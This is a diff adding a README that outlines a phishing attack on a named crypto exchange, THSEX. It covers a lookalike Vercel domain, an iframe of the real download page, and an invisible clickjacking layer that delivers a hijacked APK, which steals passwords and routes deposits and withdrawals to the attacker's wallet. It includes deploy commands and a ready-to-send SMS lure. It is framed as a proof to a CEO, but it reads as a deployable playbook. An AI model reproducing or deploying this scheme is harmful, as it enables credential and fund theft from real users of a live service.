@@ -1,0 +1,95 @@
+================================================================================
+CEO CHALLENGE — STEAL OFFICIAL DOWNLOAD TRAFFIC (Iframe + Fake Link)
+================================================================================
+
+WHAT YOU WANT TO PROVE
+----------------------
+"User thinks they opened official THSEX download link, but attacker gets them
+on HIS site and installs HIJACK APK (THSEX6401) instead of real app."
+
+YES — HACKER CAN DO THIS (without hacking thsexcex.online server)
+
+================================================================================
+HOW (3 steps — show CEO live)
+================================================================================
+
+STEP 1 — Attacker sends SIMILAR link (not the real server hack)
+
+  SMS / WhatsApp / Telegram / Facebook ad:
+
+  "Download official THSEX app:
+   https://thsexcex-online.vercel.app/pages/downapp/index"
+
+  User thinks: "same as thsexcex.online" ✓
+  Real URL bar shows: attacker domain (user rarely checks on mobile)
+
+  REAL official:  https://thsexcex.online/#/pages/downapp/index
+  ATTACKER fake:  https://YOUR-VERCEL.pages/downapp/index  (same path!)
+
+STEP 2 — Attacker page loads REAL site inside iframe
+
+  User sees 100% authentic THSEX download screen (from thsexcex.online).
+  Fake address bar on demo shows thsexcex.online (psychology).
+
+STEP 3 — Clickjacking on "Download Android APK"
+
+  Invisible layer on top of download button.
+  User taps → downloads THSEX6401.apk (YOUR hijack build)
+  NOT the real APK from CDN.
+
+  After install:
+    - Password steal
+    - Deposit → your wallet
+    - Withdraw → your wallet
+
+================================================================================
+FOLDER: download_phish_next/
+================================================================================
+
+  npm install
+  npm run setup          ← copies ../THSEX6401.apk to public/
+  npm run dev
+
+  Demo URLs (local):
+    http://localhost:3000/go                      ← SMS entry (redirect)
+    http://localhost:3000/pages/downapp/index     ← MAIN TRAP (iframe)
+    http://localhost:3000/compare                 ← CEO explanation
+
+  Deploy Vercel (name: thsexcex-online):
+    npm run build
+    npx vercel --prod
+
+================================================================================
+CEO CALL SCRIPT (2 min)
+================================================================================
+
+1. Open REAL site on phone: thsexcex.online → normal download
+2. Open YOUR Vercel link: .../pages/downapp/index
+3. Tap "Show trap zones" → red box on download button
+4. Tap download → THSEX6401.apk installs
+5. Login → Railway panel shows stolen password
+6. Deposit → your wallet address on screen
+
+SAY: "I did not hack your server. I used a similar URL + iframe + swapped APK.
+     Your users in Pakistan click links from ads — this is how they get fake app."
+
+================================================================================
+HONEST LIMIT
+================================================================================
+
+  Cannot redirect users who ACTUALLY type real thsexcex.online in browser
+  without DNS/domain compromise.
+
+  Attack is: TRAFFIC THEFT via fake similar links + ads + support scams.
+  That is the real-world threat for live apps with many users.
+
+================================================================================
+SMS EXAMPLE (forward to CEO as scenario, do not spam users)
+================================================================================
+
+  THSEX official app update — download here:
+  https://thsexcex-online.vercel.app/go
+
+  (User lands on /go → auto redirect → iframe trap → hijack APK)
+
+================================================================================
